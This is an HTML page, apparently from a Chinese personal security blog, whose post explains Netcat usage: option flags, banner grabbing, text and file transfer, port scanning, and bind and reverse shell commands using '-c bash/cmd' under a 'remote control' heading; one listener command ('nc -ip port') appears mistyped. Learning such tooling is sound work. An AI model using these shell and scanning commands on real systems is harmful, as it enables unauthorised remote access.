@@ -1,0 +1,703 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+  
+
+
+  <link rel="alternate" href="/atom.xml" title="Da4er's Blogs" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="一.简介Nc全名为Netcat，网络工具中的瑞士军刀。主要功能为：1.侦听模式&#x2F;传输模式2.telnet&#x2F;获取banner信息3.传输文本信息4.传输文件&#x2F;目录5.加密传输文件6.远程控制&#x2F;木马7.加密所有流量8.流媒体服务器9.远程克隆硬盘 123456789101112131415161718-h 查看帮助信息-d 后台模式-g gateway source-routing hop point">
+<meta property="og:type" content="article">
+<meta property="og:title" content="nc详解">
+<meta property="og:url" content="https://da4er.top/2019/11/21/nc%E8%AF%A6%E8%A7%A3/index.html">
+<meta property="og:site_name" content="Da4er&#39;s Blogs">
+<meta property="og:description" content="一.简介Nc全名为Netcat，网络工具中的瑞士军刀。主要功能为：1.侦听模式&#x2F;传输模式2.telnet&#x2F;获取banner信息3.传输文本信息4.传输文件&#x2F;目录5.加密传输文件6.远程控制&#x2F;木马7.加密所有流量8.流媒体服务器9.远程克隆硬盘 123456789101112131415161718-h 查看帮助信息-d 后台模式-g gateway source-routing hop point">
+<meta property="og:image" content="https://da4er.top/2019/11/21/nc%E8%AF%A6%E8%A7%A3/1%EF%BC%881%EF%BC%89.png">
+<meta property="og:image" content="https://da4er.top/2019/11/21/nc%E8%AF%A6%E8%A7%A3/1.png">
+<meta property="og:image" content="https://da4er.top/2019/11/21/nc%E8%AF%A6%E8%A7%A3/2.png">
+<meta property="og:image" content="https://da4er.top/2019/11/21/nc%E8%AF%A6%E8%A7%A3/3.png">
+<meta property="og:image" content="https://da4er.top/2019/11/21/nc%E8%AF%A6%E8%A7%A3/4.png">
+<meta property="og:image" content="https://da4er.top/2019/11/21/nc%E8%AF%A6%E8%A7%A3/5.png">
+<meta property="og:image" content="https://da4er.top/2019/11/21/nc%E8%AF%A6%E8%A7%A3/6.png">
+<meta property="og:image" content="https://da4er.top/2019/11/21/nc%E8%AF%A6%E8%A7%A3/7.png">
+<meta property="og:image" content="https://da4er.top/2019/11/21/nc%E8%AF%A6%E8%A7%A3/8.png">
+<meta property="og:image" content="https://da4er.top/2019/11/21/nc%E8%AF%A6%E8%A7%A3/9.png">
+<meta property="og:image" content="https://da4er.top/2019/11/21/nc%E8%AF%A6%E8%A7%A3/10.png">
+<meta property="og:image" content="https://da4er.top/2019/11/21/nc%E8%AF%A6%E8%A7%A3/11.png">
+<meta property="og:image" content="https://da4er.top/2019/11/21/nc%E8%AF%A6%E8%A7%A3/12.png">
+<meta property="og:image" content="https://da4er.top/2019/11/21/nc%E8%AF%A6%E8%A7%A3/13.png">
+<meta property="article:published_time" content="2019-11-21T07:35:03.000Z">
+<meta property="article:modified_time" content="2019-11-21T07:40:58.002Z">
+<meta property="article:author" content="Da4er&#39;s">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://da4er.top/2019/11/21/nc%E8%AF%A6%E8%A7%A3/1%EF%BC%881%EF%BC%89.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://da4er.top/2019/11/21/nc详解/"/>
+
+
+
+
+
+  <title>nc详解 | Da4er's Blogs</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Da4er's Blogs</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">代码审计</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://da4er.top/2019/11/21/nc%E8%AF%A6%E8%A7%A3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Da4er's">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Da4er's Blogs">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">nc详解</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-11-21T15:35:03+08:00">
+                2019-11-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="一-简介"><a href="#一-简介" class="headerlink" title="一.简介"></a>一.简介</h2><p>Nc全名为Netcat，网络工具中的瑞士军刀。<br>主要功能为：<br>1.侦听模式/传输模式<br>2.telnet/获取banner信息<br>3.传输文本信息<br>4.传输文件/目录<br>5.加密传输文件<br>6.远程控制/木马<br>7.加密所有流量<br>8.流媒体服务器<br>9.远程克隆硬盘<br><img src="/2019/11/21/nc%E8%AF%A6%E8%A7%A3/1%EF%BC%881%EF%BC%89.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">-h 查看帮助信息</span><br><span class="line">-d 后台模式</span><br><span class="line">-g gateway source-routing hop point[s], up to 8</span><br><span class="line">-G num source-routing pointer: 4, 8, 12, …</span><br><span class="line">-e prog程序重定向，一但连接就执行［危险］</span><br><span class="line">-i secs延时的间隔</span><br><span class="line">-l 监听模式，用于入站连接</span><br><span class="line">-L 监听模式，连接天闭后仍然继续监听，直到CTR+C</span><br><span class="line">-n IP地址，不能用域名(不使用DNS反向查询IP地址的域名)</span><br><span class="line">-o film记录16进制的传输</span><br><span class="line">-p[空格]端口 本地端口号</span><br><span class="line">-s addr 本地源地址</span><br><span class="line">-r 随机本地及远程端口</span><br><span class="line">-t 使用Telnet交互方式</span><br><span class="line">-u UDP模式</span><br><span class="line">-v 详细输出，用-vv将更详细</span><br><span class="line">-w 数字 timeout延时间隔</span><br><span class="line">-z 将输入，输出关掉（用于扫锚时）</span><br></pre></td></tr></table></figure>
+<h2 id="二-telnet-获取banner信息"><a href="#二-telnet-获取banner信息" class="headerlink" title="二.telnet/获取banner信息"></a>二.telnet/获取banner信息</h2><p>-n 参数：只接收ip，没有dns解析<br>-v 参数：返回详细信息<br>我们先来解析一下要连接的ip地址：<br><img src="/2019/11/21/nc%E8%AF%A6%E8%A7%A3/1.png" alt><br>用nc -nv 连接目标的80端口<br><img src="/2019/11/21/nc%E8%AF%A6%E8%A7%A3/2.png" alt></p>
+<h2 id="三-传输文本信息"><a href="#三-传输文本信息" class="headerlink" title="三.传输文本信息"></a>三.传输文本信息</h2><p>-l：设置为监听模式<br>-p：指定一个开放的端口<br>用-l -p参数将目标设置为服务器，并开放一个端口等待连接<br><img src="/2019/11/21/nc%E8%AF%A6%E8%A7%A3/3.png" alt><br>我们可以用nc进行聊天：<br><img src="/2019/11/21/nc%E8%AF%A6%E8%A7%A3/4.png" alt></p>
+<h2 id="四-传输文件或目录"><a href="#四-传输文件或目录" class="headerlink" title="四.传输文件或目录"></a>四.传输文件或目录</h2><p>Nc可以当作一个文件传输服务器，传输文件到目标机器。传输可分为正向传输和反向传输。<br>正向传输：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lp 444&lt;1.py</span><br><span class="line">nc -nv 1.1.1.1 444 &gt;2.py</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/11/21/nc%E8%AF%A6%E8%A7%A3/5.png" alt><br><img src="/2019/11/21/nc%E8%AF%A6%E8%A7%A3/6.png" alt></p>
+<p>反向传输：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lp 444&gt;1.py</span><br><span class="line">nc -nv 1.1.1.1 444&lt;1.py</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/11/21/nc%E8%AF%A6%E8%A7%A3/7.png" alt><br><img src="/2019/11/21/nc%E8%AF%A6%E8%A7%A3/8.png" alt></p>
+<h2 id="五-Nc端口扫描"><a href="#五-Nc端口扫描" class="headerlink" title="五.Nc端口扫描"></a>五.Nc端口扫描</h2><p>nc -nvz 开启端口扫描 默认扫描tcp端口<br>nc -nvzu 扫描udp端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -nvz 1.1.1.1 1-65535</span><br><span class="line">nc -nvzu 1.1.1.1 1-1024</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/11/21/nc%E8%AF%A6%E8%A7%A3/9.png" alt></p>
+<h2 id="六-远程控制"><a href="#六-远程控制" class="headerlink" title="六.远程控制"></a>六.远程控制</h2><p>正向控制：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lp port -c bash&#x2F;cmd</span><br><span class="line">nc -nv ip</span><br></pre></td></tr></table></figure>
+<p>意思是服务器开放一个端口，当客户端连接时直接获取shell，这样在客户端就能执行服务器的命令<br><img src="/2019/11/21/nc%E8%AF%A6%E8%A7%A3/10.png" alt><br><img src="/2019/11/21/nc%E8%AF%A6%E8%A7%A3/11.png" alt></p>
+<p>反向控制：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -ip port</span><br><span class="line">nc -nv ip -c bash&#x2F;cmd</span><br></pre></td></tr></table></figure>
+<p>意思是服务器开放一个端口，当客户端连接时直接将自己的shell给服务器端，在服务器端执行客户端命令<br><img src="/2019/11/21/nc%E8%AF%A6%E8%A7%A3/12.png" alt><br><img src="/2019/11/21/nc%E8%AF%A6%E8%A7%A3/13.png" alt></p>
+<p>好久没更新了，因为最近一直按专题学习常见的漏洞，也没啥好写的，最近在学习sql注入，等写完了再一块发出来吧~</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/11/09/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%88%9D%E8%AF%95-%E5%AF%B9zvuldrill%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%B8%80/" rel="next" title="代码审计初试-对zvuldrill漏洞靶场的代码审计(一)">
+                <i class="fa fa-chevron-left"></i> 代码审计初试-对zvuldrill漏洞靶场的代码审计(一)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/11/23/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/" rel="prev" title="Mysql注入详解">
+                Mysql注入详解 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Da4er's</p>
+              <p class="site-description motion-element" itemprop="description">Web安全，代码审计，渗透测试，CTF</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一-简介"><span class="nav-number">1.</span> <span class="nav-text">一.简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二-telnet-获取banner信息"><span class="nav-number">2.</span> <span class="nav-text">二.telnet&#x2F;获取banner信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三-传输文本信息"><span class="nav-number">3.</span> <span class="nav-text">三.传输文本信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#四-传输文件或目录"><span class="nav-number">4.</span> <span class="nav-text">四.传输文件或目录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#五-Nc端口扫描"><span class="nav-number">5.</span> <span class="nav-text">五.Nc端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#六-远程控制"><span class="nav-number">6.</span> <span class="nav-text">六.远程控制</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Da4er's</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
